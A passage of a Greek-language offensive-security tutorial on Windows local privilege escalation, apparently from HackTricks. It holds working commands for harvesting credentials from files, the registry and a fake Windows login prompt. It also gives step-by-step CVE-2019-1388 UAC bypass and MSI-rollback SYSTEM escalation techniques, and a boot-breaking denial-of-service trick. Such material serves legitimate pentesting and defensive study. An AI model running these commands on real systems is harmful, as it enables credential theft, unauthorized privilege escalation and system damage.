Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισάγει τα διαπιστευτήριά του ή ακόμα και τα διαπιστευτήρια ενός άλλου χρήστη** αν νομίζετε ότι μπορεί να τα γνωρίζει (Σημειώστε ότι το **να ζητήσετε** απευθείας από τον πελάτη τα **διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που πριν από κάποιο καιρό περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Αναζήτηση σε όλα τα προτεινόμενα αρχεία:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στο RecycleBin

Πρέπει επίσης να ελέγξετε τον Bin για να αναζητήσετε διαπιστευτήρια μέσα σε αυτόν

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά κλειδιά του registry με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Πρέπει να ελέγξετε για dbs όπου αποθηκεύονται κωδικοί από **Chrome or Firefox**.\
Επίσης ελέγξτε το ιστορικό, τα bookmarks και τα favourites των browser, γιατί ίσως κάποιοι **κωδικοί** είναι αποθηκευμένοι εκεί.

Εργαλεία για εξαγωγή κωδικών από browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows που επιτρέπει την αλληλεπικοινωνία μεταξύ συστατικών λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε COM component αναγνωρίζεται μέσω ενός class ID (CLSID) και κάθε component εκθέτει λειτουργικότητα μέσω μίας ή περισσοτέρων interfaces, αναγνωρισμένων μέσω interface IDs (IIDs).

Οι COM classes και interfaces ορίζονται στο registry κάτω από **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το registry δημιουργείται με τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το child registry **InProcServer32** το οποίο περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια τιμή που ονομάζεται **ThreadingModel** που μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, αν μπορείτε να overwrite οποιοδήποτε από τα DLLs που πρόκειται να εκτελεστούν, θα μπορούσατε να escalate privileges αν αυτό το DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση αρχείου με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζητήστε στο μητρώο ονόματα κλειδιών και κωδικούς πρόσβασης**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin που δημιούργησα για να **automatically execute every metasploit POST module that searches for credentials** μέσα στο victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν passwords που αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμα εξαιρετικό εργαλείο για να εξάγει password από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** από διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Φανταστείτε ότι **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. Η ίδια διεργασία **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Στη συνέχεια, αν έχετε **full access to the low privileged process**, μπορείτε να αρπάξετε το **open handle to the privileged process created** με `OpenProcess()` και να **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τμήματα κοινής μνήμης, γνωστά ως **pipes**, επιτρέπουν την επικοινωνία διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, επιτρέποντας σε ανεξάρτητες διεργασίες να μοιράζονται δεδομένα, ακόμη και σε διαφορετικά δίκτυα. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν δεδομένα αποστέλλονται μέσω ενός pipe από έναν **client**, ο **server** που δημιούργησε το pipe έχει τη δυνατότητα να **take on the identity** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Η εύρεση μιας **privileged process** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε δίνει την ευκαιρία να **gain higher privileges** υιοθετώντας την ταυτότητα αυτής της διεργασίας όταν αλληλεπιδρά με το pipe που δημιουργήσατε. Για οδηγίες εκτέλεσης τέτοιου είδους επίθεσης, χρήσιμοι οδηγοί υπάρχουν [**here**](named-pipe-client-impersonation.md) και [**here**](#from-high-integrity-to-system).

Επιπλέον, το παρακάτω εργαλείο επιτρέπει να **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Όταν αποκτάτε ένα shell ως χρήστης, μπορεί να υπάρχουν προγραμματισμένες εργασίες ή άλλες διεργασίες που εκτελούνται οι οποίες **pass credentials on the command line**. Το παρακάτω script καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας οποιεσδήποτε διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω console ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις του Microsoft Windows είναι δυνατό να εκτελέσετε ένα terminal ή οποιαδήποτε άλλη διεργασία όπως την "NT\AUTHORITY SYSTEM" από έναν μη προνομιακό χρήστη.

Αυτό καθιστά δυνατή την κλιμάκωση προνομίων και την παράκαμψη του UAC ταυτόχρονα μέσω της ίδιας ευπάθειας. Επιπλέον, δεν υπάρχει ανάγκη να εγκατασταθεί οτιδήποτε και το binary που χρησιμοποιείται κατά τη διαδικασία είναι signed και εκδίδεται από τη Microsoft.

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείτε αυτήν την ευπάθεια, είναι απαραίτητο να εκτελέσετε τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Από Administrator Medium σε High Integrity Level / Παράκαμψη UAC

Διάβασε αυτό για να μάθεις σχετικά με τα Integrity Levels:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια διάβασε αυτό για να μάθεις σχετικά με το UAC και τις παρακάμψεις UAC:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Από Arbitrary Folder Delete/Move/Rename σε SYSTEM EoP

Η τεχνική που περιγράφεται [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) με κώδικα exploit [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση βασικά συνίσταται στην κατάχρηση της rollback λειτουργίας του Windows Installer για να αντικαταστήσει νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό ο επιτιθέμενος πρέπει να δημιουργήσει ένα **malicious MSI installer** που θα χρησιμοποιηθεί για να καταλάβει το φάκελο `C:\Config.Msi`, ο οποίος αργότερα θα χρησιμοποιηθεί από τον Windows Installer για να αποθηκεύσει τα rollback αρχεία κατά την απεγκατάσταση άλλων MSI πακέτων, όπου τα rollback αρχεία θα είχαν τροποποιηθεί για να περιέχουν το κακόβουλο payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) υποθέτει ότι μπορείς να διαγράψεις έναν **ολόκληρο φάκελο** (π.χ., `C:\Config.Msi`). Αλλά τι γίνεται αν η ευπάθειά σου επιτρέπει μόνο **arbitrary file deletion**;

Μπορείς να εκμεταλλευτείς τα εσωτερικά του NTFS: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Άρα, αν **διαγράψεις το stream `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείς να το κάνεις χρησιμοποιώντας τα τυπικά APIs διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρόλο που καλείς ένα *file* delete API, αυτό **διαγράφει τον ίδιο τον φάκελο**.

### Από τη Διαγραφή Περιεχομένων Φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σου δεν σου επιτρέπει να διαγράψεις αυθαίρετα αρχεία/φακέλους, αλλά **επιτρέπει τη διαγραφή των *contents* ενός attacker-controlled folder**;

1. Βήμα 1: Στήσιμο φακέλου δολώματος και αρχείου
- Δημιούργησε: `C:\temp\folder1`
- Μέσα σε αυτό: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια διεργασία με προνόμια προσπαθεί να διαγράψει το `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Εκκίνηση της διεργασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, η **oplock ενεργοποιείται** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακινήστε το `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να διακόπτει την oplock.
- Μην διαγράψετε το `file1.txt` απευθείας — αυτό θα απελευθέρωνε την oplock πρόωρα.

- Επιλογή B: Μετατρέψτε το `folder1` σε **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει στο εσωτερικό NTFS stream που αποθηκεύει τα μεταδεδομένα του φακέλου — η διαγραφή του διαγράφει τον φάκελο.

5. Βήμα: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει `file1.txt`.
- Αλλά τώρα, εξαιτίας του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από Arbitrary Folder Create σε Μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **create an arbitrary folder as SYSTEM/admin** — ακόμα και αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **critical Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτό το μονοπάτι κανονικά αντιστοιχεί στον kernel-mode driver `cng.sys`.
- Αν το **δημιουργήσετε εκ των προτέρων ως φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βλέπει το φάκελο, **αποτυγχάνει να εντοπίσει τον πραγματικό driver**, και **προκαλεί σφάλμα (crash) ή σταματά την εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση (fallback)**, και **δεν υπάρχει δυνατότητα ανάκτησης** χωρίς εξωτερική παρέμβαση (π.χ. επιδιόρθωση εκκίνησης ή πρόσβαση στο δίσκο).


## **From High Integrity to System**

### **Νέα υπηρεσία**

Εάν ήδη τρέχετε σε μια διαδικασία High Integrity, η **διαδρομή προς το SYSTEM** μπορεί να είναι εύκολη απλά με το **να δημιουργήσετε και να εκτελέσετε μια νέα υπηρεσία**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Όταν δημιουργείτε ένα service binary βεβαιωθείτε ότι είναι ένα έγκυρο service ή ότι το binary εκτελεί τις απαραίτητες ενέργειες αρκετά γρήγορα καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια High Integrity διεργασία μπορείτε να δοκιμάσετε να **ενεργοποιήσετε τα AlwaysInstallElevated registry entries** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες σχετικά με τα registry keys που εμπλέκονται και πώς να εγκαταστήσετε ένα _.msi_ πακέτο εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε** [**να βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια ήδη High Integrity διεργασία), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (όχι protected processes) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **τυχαία διεργασία με εκείνο το token**.\
Η χρήση αυτής της τεχνικής συνήθως **επιλέγει οποιαδήποτε διεργασία τρέχει ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε SYSTEM διεργασίες χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για να αυξήσει δικαιώματα στο `getsystem`. Η τεχνική συνίσταται στο **δημιουργία ενός pipe και στη συνέχεια τη δημιουργία/κατάχρηση ενός service για να γράψει σε αυτό το pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα μπορεί να **προσποιηθεί (impersonate) το token** του client του pipe (το service), αποκτώντας δικαιώματα SYSTEM.\
Αν θέλετε να [**μάθετε περισσότερα για name pipes πρέπει να διαβάσετε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα [**πώς να πάτε από high integrity σε System χρησιμοποιώντας name pipes πρέπει να διαβάσετε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **hijackάρετε μια dll** που **φορτώνεται** από μια **διεργασία** που τρέχει ως **SYSTEM**, θα μπορέσετε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation και, επιπλέον, είναι πολύ **πιο εύκολο να επιτευχθεί από μια high integrity διεργασία** καθώς θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε** [**να μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Καλύτερο εργαλείο για αναζήτηση Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για λανθασμένες ρυθμίσεις και ευαίσθητα αρχεία (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Ανιχνεύθηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για κάποιες πιθανές λανθασμένες ρυθμίσεις και συλλογή πληροφοριών (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για λανθασμένες ρυθμίσεις**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες συνεδρίες PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Ανιχνεύθηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Ψεκασμός (spray) των συλλεχθέντων κωδικών σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer και εργαλείο man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική enumeration για Windows privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Αναζήτηση γνωστών privesc ευπαθειών (DEPRECATED για Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Χρειάζεται Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών privesc ευπαθειών (χρειάζεται να μεταγλωττιστεί με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Εντοπίζει στο host αναζητώντας λανθασμένες ρυθμίσεις (πιο εργαλείο συλλογής πληροφοριών παρά privesc) (χρειάζεται να μεταγλωττιστεί) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά προγράμματα (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Έλεγχος για λανθασμένες ρυθμίσεις (εκτελέσιμο precompiled στο github). Όχι συνιστώμενο. Δεν δουλεύει καλά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές λανθασμένες ρυθμίσεις (exe από python). Όχι συνιστώμενο. Δεν δουλεύει καλά σε Win10.

**Bat**

